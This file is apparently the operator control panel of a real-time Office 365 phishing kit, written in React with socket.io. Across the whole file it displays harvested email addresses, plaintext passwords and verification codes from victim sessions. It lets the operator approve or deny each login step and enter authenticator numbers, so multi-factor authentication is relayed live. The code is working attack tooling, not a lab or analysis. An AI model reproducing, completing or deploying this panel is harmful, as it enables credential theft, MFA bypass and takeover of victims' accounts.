/* eslint-disable no-unused-vars */

import React, { useEffect, useState } from "react";
import { Menu, Menu as MenuIcon, Search } from "lucide-react";
import io from "socket.io-client";
import {
  Box,
  Button,
  Card,
  Flex,
  Grid,
  GridItem,
  HStack,
  Image,
  Link,
  Text,
  VStack,
  Badge,
  Heading,
  IconButton,
  Input,
} from "@chakra-ui/react";
import { eventConfig } from "../lib/eventConfig";

const AdminDashboard = () => {
  const [sessions, setSessions] = useState({});
  const [socket, setSocket] = useState(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [authNumber, setAuthNumber] = useState("");

  // Define step navigation configuration for different event types
  // const eventConfig = {
  //   "email-verification": {
  //     continue: {
  //       nextStep: "1",
  //       message: "Email verified successfully",
  //       action: "PROCEED_TO_PASSWORD",
  //     },
  //     cancel: {
  //       nextStep: "0",
  //       message: "Email verification failed. Please try again.",
  //       action: "RESET_EMAIL",
  //     },
  //   },
  //   "password-submission": {
  //     continue: {
  //       nextStep: "2",
  //       message: "Password verified successfully",
  //       action: "PROCEED_TO_2FA",
  //     },
  //     cancel: {
  //       nextStep: "1",
  //       message: "Invalid password. Please try again.",
  //       action: "RESET_PASSWORD",
  //     },
  //   },
  // "authenticator-verification": {
  //   continue: {
  //     nextStep: "success",
  //     message: "Authentication successful",
  //     action: "COMPLETE_AUTH",
  //   },
  //   cancel: {
  //     nextStep: "2",
  //     message:
  //       "Authentication failed. Please try again or choose another method.",
  //     action: "RESET_2FA",
  //   },
  // },
  // "verification-code": {
  //   continue: {
  //     nextStep: "7",
  //     message: "Code verified successfully",
  //     action: "PROCEED_TO_FINAL",
  //   },
  //   cancel: {
  //     nextStep: "4",
  //     message: "Invalid code. Please try again.",
  //     action: "RESET_CODE",
  //   },
  // },
  // "phone-verification": {
  //   continue: {
  //     nextStep: "7",
  //     message: "Phone verification successful",
  //     action: "PROCEED_TO_FINAL",
  //   },
  //   cancel: {
  //     nextStep: "2",
  //     message: "Phone verification failed. Please try another method.",
  //     action: "RESET_PHONE",
  //   },
  // },
  // };

  useEffect(() => {
    const socketURL = import.meta.env.VITE_BASE_URL;
    const newSocket = io(socketURL);

    newSocket.on("connect", () => {
      console.log("Connected to socket server");
      newSocket.emit("register_admin");
    });

    newSocket.on("new-login-attempt", (data) => {
      setSessions((prev) => ({
        ...prev,
        [data.sessionId]: {
          ...prev[data.sessionId],
          sessionId: data.sessionId,
          email: data.email,
          lastActivity: new Date(data.timestamp),
          events: [
            ...(prev[data.sessionId]?.events || []),
            {
              type: "email-verification",
              timestamp: data.timestamp,
              data: data.email,
              status: "pending",
            },
          ],
        },
      }));
    });

    // newSocket.on("password-attempt", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "password-submission",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("password-attempt", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the data provided
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "password-submission",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "password-submission",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    // newSocket.on("authenticator-select", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "authenticator-select",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("authenticator-select", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the received data
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "authenticator-select",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password, // Assuming 'data.password' is relevant here
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "authenticator-select",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password, // Assuming 'data.password' is relevant here
                status: "pending",
                email: session.email, // Use the email from the existing session
              },
            ],
          },
        };
      });
    });

    // newSocket.on("verifycode-select", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "verifycode-select",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("verifycode-select", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the data
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "verifycode-select",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "verifycode-select",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    // newSocket.on("verify-click", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "verify-click",
    //             timestamp: data.timestamp,
    //             password: data.password,
    //             data: data.verifyCode,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("verify-click", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "verify-click",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  data: data.verifyCode,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "verify-click",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                data: data.verifyCode,
                status: "pending",
                email: session.email,
              },
            ],
          },
        };
      });
    });

    // newSocket.on("text-select", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "text-select",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("text-select", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from data
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "text-select",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password, // Assuming 'password' is relevant here
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "text-select",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password, // Assuming 'password' is relevant here
                status: "pending",
                email: session.email,
              },
            ],
          },
        };
      });
    });

    newSocket.on("text-click", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email,
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "text-click",
                  timestamp: data.timestamp || new Date().toISOString(),
                  password: data.password,
                  data: data.verifyCode,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "text-click",
                timestamp: data.timestamp || new Date().toISOString(),
                password: data.password,
                data: data.verifyCode,
                status: "pending",
                email: session.email,
              },
            ],
          },
        };
      });
    });

    // newSocket.on("call-select", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "call-select",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("call-select", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the data provided
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "call-select",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password, // Use password from the data
                  status: "pending",
                  email: data.email, // Set email from data
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "call-select",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password, // Use password from the data
                status: "pending",
                email: session.email, // Use email from session
              },
            ],
          },
        };
      });
    });

    // newSocket.on("call-authenticated", (data) => {
    //   setSessions((prev) => {
    //     const session = prev[data.sessionId];
    //     if (!session) return prev;

    //     return {
    //       ...prev,
    //       [data.sessionId]: {
    //         ...session,
    //         lastActivity: new Date(data.timestamp),
    //         events: [
    //           ...session.events,
    //           {
    //             type: "call-authenticated",
    //             timestamp: data.timestamp,
    //             data: data.password,
    //             status: "pending",
    //             email: session.email,
    //           },
    //         ],
    //       },
    //     };
    //   });
    // });

    newSocket.on("call-authenticated", (data) => {
      setSessions((prev) => {
        const session = prev[data.sessionId];

        // If session doesn't exist, initialize it
        if (!session) {
          return {
            ...prev,
            [data.sessionId]: {
              email: data.email, // Initialize email from the data provided
              lastActivity: new Date(data.timestamp || Date.now()),
              events: [
                {
                  type: "call-authenticated",
                  timestamp: data.timestamp || new Date().toISOString(),
                  data: data.password,
                  status: "pending",
                  email: data.email,
                },
              ],
            },
          };
        }

        // If session exists, update it
        return {
          ...prev,
          [data.sessionId]: {
            ...session,
            lastActivity: new Date(data.timestamp || Date.now()),
            events: [
              ...session.events,
              {
                type: "call-authenticated",
                timestamp: data.timestamp || new Date().toISOString(),
                data: data.password,
                status: "pending",
                email: session.email, // Use email from the session
              },
            ],
          },
        };
      });
    });

    setSocket(newSocket);

    return () => newSocket.disconnect();
  }, []);

  useEffect(() => {
    console.log("sesh", sessions);
  }, [sessions]);
  const handleResponse = (sessionId, eventIndex, response) => {
    const event = sessions[sessionId].events[eventIndex];
    const config = eventConfig[event.type]?.[response];

    if (!config) {
      console.error(
        `No configuration found for event type: ${event.type} with response: ${response}`
      );
      return;
    }

    // Send the complete admin response including all metadata from eventConfig
    socket.emit("admin_response", {
      sessionId,
      eventIndex,
      response,
      timestamp: new Date().toISOString(),
      eventType: event.type,
      // Include the full config data in the response
      ...config,
      email: event.email || sessions[sessionId].email,
      authNumber: authNumber || "",
    });

    setSessions((prev) => ({
      ...prev,
      [sessionId]: {
        ...prev[sessionId],
        events: prev[sessionId].events.map((evt, index) =>
          index === eventIndex ? { ...evt, status: response } : evt
        ),
      },
    }));
  };

  const getEventBorderColor = (status) => {
    switch (status) {
      case "pending":
        return "red.200";
      case "continue":
        return "green.200";
      case "authenticate":
        return "red.200";
      case "verify":
        return "yellow.200";
      case "cancel":
        return "red.200";
      default:
        return "gray.200";
    }
  };

  const getStatusProps = (status) => {
    switch (status) {
      case "pending":
        return { colorScheme: "red" };
      case "continue":
        return { colorScheme: "green" };
      case "authenticate":
        return { colorScheme: "blue" };
      case "verify":
        return { colorScheme: "blue" };
      case "cancel":
        return { colorScheme: "black" };
      default:
        return { colorScheme: "gray" };
    }
  };

  const getEventTitle = (event) => {
    switch (event.type) {
      case "email-verification":
        return "Email Verification Request";
      case "password-submission":
        return "Password Submission Attempt";
      case "personal-info-submission":
        return "Personal Information Verification";
      case "authenticator-select":
        return "Authenticator App Selected";
      case "verifycode-select":
        return "Verification Code Selected";
      case "verify-click":
        return "Verify Button Clicked";
      case "text-select":
        return "Text Method Selected";
      case "text-click":
        return "Text Verify Clicked";
      case "call-select":
        return "Call Method Selected";

      default:
        return "Unknown Event";
    }
  };

  const filteredSessions = Object.entries(sessions).filter(([sessionId]) =>
    sessionId.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <Box
      bgImage="url('/images/bg.svg')"
      // pt="80px"
      px={4}
      pb={4}
      display="flex"
      flexDirection="column"
      height="100vh" // Make the main container take the full height
    >
      <HStack w="100%" justify="space-between" pr="1rem">
        <Link href="/">
          <Image src="/images/office365.png" alt="logo" w="5rem" />
        </Link>
        <Menu size={24} />
      </HStack>
      {/* Search Bar */}
      <Box mb={4}>
        <Input
          placeholder="Search by Session ID..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          bg="white"
        />
      </Box>

      {/* Scrollable Session List */}
      <Box
        flex="1" // Allow this section to grow and take available space
        overflowY="auto" // Enable vertical scrolling
        bg="whiteAlpha.900"
        borderRadius="md"
        boxShadow="sm"
        p={4}
      >
        <VStack spacing={4} align="stretch">
          {filteredSessions.map(([sessionId, session]) => (
            <VStack key={sessionId} spacing={4} align="stretch">
              {session.events.map((event, index) => (
                <Card.Root
                  key={`${sessionId}-${index}`}
                  borderWidth="2px"
                  borderColor={getEventBorderColor(event.status)}
                >
                  <Card.Description>
                    <Box p={4}>
                      <Flex justify="space-between" align="center">
                        <HStack spacing={4}>
                          <Heading size="sm">{getEventTitle(event)}</Heading>
                          <Badge {...getStatusProps(event.status)}>
                            {event.status}
                          </Badge>
                        </HStack>
                        <Text fontSize="sm" color="gray.500">
                          {new Date(event.timestamp).toLocaleString()}
                        </Text>
                      </Flex>

                      <Grid templateColumns="repeat(2, 1fr)" gap={4} mt={4}>
                        <GridItem>
                          <Text
                            fontSize="sm"
                            fontWeight="medium"
                            color="gray.500"
                          >
                            Session ID
                          </Text>
                          <Text mt={1}>{sessionId}</Text>
                        </GridItem>
                        <GridItem>
                          <Text
                            fontSize="sm"
                            fontWeight="medium"
                            color="gray.500"
                          >
                            {event.type === "verify-click"
                              ? "Email & Password"
                              : "Email"}
                          </Text>
                          <Text mt={1}>
                            {event.type === "verify-click" ? (
                              <>
                                {event.email || session.email} &{" "}
                                {event.password}
                              </>
                            ) : (
                              <>{event.email || session.email}</>
                            )}
                          </Text>
                        </GridItem>
                        <GridItem>
                          <Text
                            fontSize="sm"
                            fontWeight="medium"
                            color="gray.500"
                          >
                            Event Type
                          </Text>
                          <Text mt={1}>{event.type}</Text>
                        </GridItem>
                        <GridItem>
                          <Text
                            fontSize="sm"
                            fontWeight="medium"
                            color="gray.500"
                          >
                            Submitted Data
                          </Text>
                          <Text
                            bg={
                              event.type === "password-submission"
                                ? "red.500"
                                : event.type === "email-verification"
                                ? "green.500"
                                : event.type === "verify-click"
                                ? "blue.500"
                                : event.type === "authenticator-select"
                                ? "purple.500"
                                : event.type === "text-select"
                                ? "orange.500"
                                : event.type === "text-click"
                                ? "teal.500"
                                : "yellow.500"
                            }
                            w="fit-content"
                            borderRadius="12px"
                            px="0.5rem"
                            color="#fff"
                            mt={1}
                          >
                            {event.data}
                          </Text>
                        </GridItem>
                      </Grid>

                      {event.status === "pending" &&
                        (event.type !== "authenticator-select" ? (
                          event.type === "verifycode-select" ? (
                            <>
                              <Button
                                colorScheme="green"
                                onClick={() =>
                                  handleResponse(sessionId, index, "verify")
                                }
                              >
                                Verify vcode-select
                              </Button>
                              <Button
                                colorScheme="red"
                                onClick={() =>
                                  handleResponse(sessionId, index, "cancel")
                                }
                              >
                                Deny vcode-select
                              </Button>
                            </>
                          ) : event.type === "email-verification" ||
                            event.type === "password-submission" ? (
                            <>
                              <Button
                                colorScheme="green"
                                onClick={() =>
                                  handleResponse(sessionId, index, "continue")
                                }
                              >
                                Approve
                              </Button>
                              <Button
                                colorScheme="red"
                                onClick={() =>
                                  handleResponse(sessionId, index, "cancel")
                                }
                              >
                                Deny
                              </Button>
                            </>
                          ) : event.type === "verify-click" ? (
                            <>
                              <Button
                                colorScheme="green"
                                onClick={() =>
                                  handleResponse(sessionId, index, "continue")
                                }
                              >
                                Approve verify-click
                              </Button>
                              <Button
                                colorScheme="red"
                                onClick={() =>
                                  handleResponse(sessionId, index, "cancel")
                                }
                              >
                                Deny verify-click
                              </Button>
                            </>
                          ) : event.type === "text-select" ? (
                            <>
                              <Button
                                colorScheme="green"
                                onClick={() =>
                                  handleResponse(sessionId, index, "approve")
                                }
                              >
                                Approve text-select
                              </Button>
                              <Button
                                colorScheme="red"
                                onClick={() =>
                                  handleResponse(sessionId, index, "cancel")
                                }
                              >
                                Deny text-select
                              </Button>
                            </>
                          ) : event.type === "text-click" ? (
                            <>
                              <Button
                                colorScheme="green"
                                onClick={() =>
                                  handleResponse(sessionId, index, "continue")
                                }
                              >
                                Approve text-click
                              </Button>
                              <Button
                                colorScheme="red"
                                onClick={() =>
                                  handleResponse(sessionId, index, "cancel")
                                }
                              >
                                Deny text-click
                              </Button>
                            </>
                          ) : event.type === "call-select" ? (
                            <>
                              <Button
                                colorScheme="green"
                                onClick={() =>
                                  handleResponse(sessionId, index, "call")
                                }
                              >
                                Approve call-select
                              </Button>
                              <Button
                                colorScheme="red"
                                onClick={() =>
                                  handleResponse(sessionId, index, "cancel")
                                }
                              >
                                Deny call-select
                              </Button>
                            </>
                          ) : (
                            <>
                              <Text>No Button for you yet</Text>
                            </>
                          )
                        ) : (
                          <HStack spacing={4} mt={4}>
                            <Input
                              type="text"
                              name="authNumber"
                              value={authNumber}
                              onChange={(e) => setAuthNumber(e.target.value)}
                              placeholder="Enter Number From Authenticator"
                            />
                            <Button
                              colorScheme="green"
                              onClick={() =>
                                handleResponse(sessionId, index, "authenticate")
                              }
                            >
                              Approve auth-select
                            </Button>
                          </HStack>
                        ))}

                      {event.status === "authenticate" && (
                        <Button
                          colorScheme="green"
                          onClick={() =>
                            handleResponse(sessionId, index, "continue")
                          }
                        >
                          Authenticate
                        </Button>
                      )}

                      {event.status === "call" && (
                        <Button
                          colorScheme="green"
                          onClick={() =>
                            handleResponse(sessionId, index, "continue")
                          }
                        >
                          Call Authenticated
                        </Button>
                      )}

                      {/* {event.status === "pending" &&
                      event.type !== "authenticator-select" ? (
                        <HStack spacing={4} mt={4}>
                          <Button
                            colorScheme="green"
                            onClick={() =>
                              handleResponse(sessionId, index, "continue")
                            }
                          >
                            Approve
                          </Button>
                          <Button
                            colorScheme="red"
                            onClick={() =>
                              handleResponse(sessionId, index, "cancel")
                            }
                          >
                            Deny
                          </Button>
                        </HStack>
                      ) : (
                        <>
                          <HStack>
                            <Input
                              type="text"
                              name="authNumber"
                              value={authNumber}
                              onChange={(e) => {
                                setAuthNumber(e.target.value);
                              }}
                              placeholder="Enter Number From Authenticator"
                            />
                            <Button
                              colorScheme="green"
                              onClick={() =>
                                handleResponse(sessionId, index, "continue")
                              }
                            >
                              Approve
                            </Button>
                          </HStack>
                        </>
                      )} */}
                    </Box>
                  </Card.Description>
                </Card.Root>
              ))}
            </VStack>
          ))}

          {filteredSessions.length === 0 && (
            <Text textAlign="center" color="gray.500">
              {searchQuery
                ? "No sessions found matching your search."
                : "No active sessions."}
            </Text>
          )}
        </VStack>
      </Box>
    </Box>
  );
};

export default AdminDashboard;
